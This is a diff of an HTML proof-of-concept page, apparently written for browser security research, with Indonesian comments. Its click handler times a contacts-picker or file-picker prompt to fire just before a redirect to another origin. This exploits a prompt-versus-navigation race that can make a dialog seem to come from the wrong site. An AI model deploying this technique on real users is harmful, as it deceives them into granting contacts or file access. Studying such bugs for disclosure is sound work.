@@ -6,23 +6,19 @@
         <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
         <script>
             window.onclick = () => {
-                // 1. Jalankan fungsi permission dengan delay
-                setTimeout(async () => {
-                    try {
-                        console.log("Memicu request kontak...");
-                        // Request ini dipicu sesaat sebelum atau saat navigasi berjalan
-                        await navigator.contacts.select(["name"], {});
-                    } catch (e) {
-                        console.log("Request gagal atau dibatalkan karena navigasi.");
-                    }
-                }, 500); // Delay 500ms agar eksekusi berdekatan dengan redirect
+    setTimeout(async () => {
+        try {
+            // Memicu dialog buka file
+            await window.showOpenFilePicker();
+        } catch (e) {
+            console.log("File picker dibatalkan.");
+        }
+    }, 500);
 
-                // 2. Segera redirect ke origin lain
-                // Gunakan delay sedikit lebih lama pada redirect agar browser sempat memproses setTimeout pertama
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 600);
-            }
+    setTimeout(() => {
+        window.location.href = "https://www.google.com";
+    }, 600);
+}
         </script>
     </head>  
     <body>
